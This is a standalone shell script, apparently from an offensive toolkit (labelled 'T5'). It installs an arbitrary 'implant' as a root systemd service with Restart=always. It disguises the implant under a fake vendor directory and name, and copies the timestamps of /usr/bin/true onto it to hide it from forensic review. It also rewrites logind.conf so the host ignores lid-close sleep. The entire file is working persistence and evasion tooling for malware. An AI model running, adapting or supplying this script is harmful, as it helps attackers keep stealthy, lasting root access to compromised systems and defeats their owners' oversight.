#!/bin/sh
# T5 — Linux root persistence: systemd system unit (Restart=always) with the
# payload under /usr/lib/<vendor>/ and timestamps matched to a system binary.
# usage: sudo install-system.sh <implant-path> [name]
# Requires root.
set -eu

[ "$(id -u)" = "0" ] || { echo "run as root" >&2; exit 1; }
PAYLOAD="${1:?usage: install-system.sh <implant-path> [name]}"
NAME="${2:-fleet-agent}"
VENDOR="fleet"
DIR="/usr/lib/${VENDOR}"
DEST="${DIR}/${NAME}"
UNIT="/etc/systemd/system/${NAME}.service"

mkdir -p "$DIR"
cp "$PAYLOAD" "$DEST"
chmod 0755 "$DEST"
chown root:root "$DEST"

# match timestamps of a ubiquitous system binary
SRC="/usr/bin/true"
if [ -f "$SRC" ]; then
    touch -r "$SRC" "$DEST" 2>/dev/null || true
fi

# stay awake: ignore lid-close sleep in logind (root context).
if [ -f /etc/systemd/logind.conf ]; then
  sed -i 's/^#*HandleLidSwitch=.*/HandleLidSwitch=ignore/' /etc/systemd/logind.conf 2>/dev/null || true
  sed -i 's/^#*HandleLidSwitchExternalPower=.*/HandleLidSwitchExternalPower=ignore/' /etc/systemd/logind.conf 2>/dev/null || true
  systemctl restart systemd-logind >/dev/null 2>&1 || true
fi

cat > "$UNIT" <<EOF
[Unit]
Description=${NAME}
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=${DEST}
Restart=always
RestartSec=10
NoNewPrivileges=yes

[Install]
WantedBy=multi-user.target
EOF

chmod 0644 "$UNIT"
systemctl daemon-reload
systemctl enable "$NAME.service" >/dev/null 2>&1 || true
systemctl restart "$NAME.service"
echo "installed systemd unit ${NAME} -> ${DEST}"
